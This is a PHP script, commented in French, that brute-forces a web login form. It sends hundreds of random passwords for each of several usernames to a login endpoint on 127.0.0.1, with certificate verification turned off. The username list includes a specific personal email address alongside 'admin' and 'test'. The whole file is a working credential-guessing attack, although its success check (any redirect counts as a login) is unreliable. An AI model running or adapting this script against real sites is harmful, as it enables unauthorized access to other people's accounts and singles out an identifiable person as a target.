<?php
// Liste des noms d'utilisateur à tester
$usernames = [
    'admin',
    'user',
    'test',
    'carolane.m@live.fr'
    // Ajoutez d'autres noms d'utilisateur courants ici
];

// URL de la page de connexion
$loginUrl = 'https://127.0.0.1:8000/login';

// Fonction pour générer un mot de passe aléatoire
function generateRandomPassword($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

// Fonction pour envoyer une requête POST à la page de connexion
function attemptLogin($url, $username, $password) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        '_username' => $username,
        '_password' => $password,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt'); // Stocker les cookies

    // Exécuter la requête cURL
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $redirectUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    // Vérifiez si la connexion a réussi en comparant l'URL de redirection
    if ($redirectUrl !== $url) {
        return true;
    }
    return false;
}

// Mesurer le temps d'exécution
$startTime = microtime(true);

// Tester chaque combinaison d'identifiants et de mots de passe
$success = false;
foreach ($usernames as $username) {
    for ($attempt = 1; $attempt <= 500; $attempt++) {
        $password = generateRandomPassword();
        if (attemptLogin($loginUrl, $username, $password)) {
            $endTime = microtime(true);
            $executionTime = $endTime - $startTime;
            echo "Connexion réussie avec l'utilisateur : $username et le mot de passe : $password\n";
            echo "Temps total pour trouver le bon mot de passe : $executionTime secondes\n";
            $success = true;
            break 2; // Sortir des deux boucles si la connexion réussit
        }
    }
}

if (!$success) {
    $endTime = microtime(true);
    $executionTime = $endTime - $startTime;
    echo "Aucun mot de passe trouvé. Temps total d'exécution : $executionTime secondes\n";
}
?>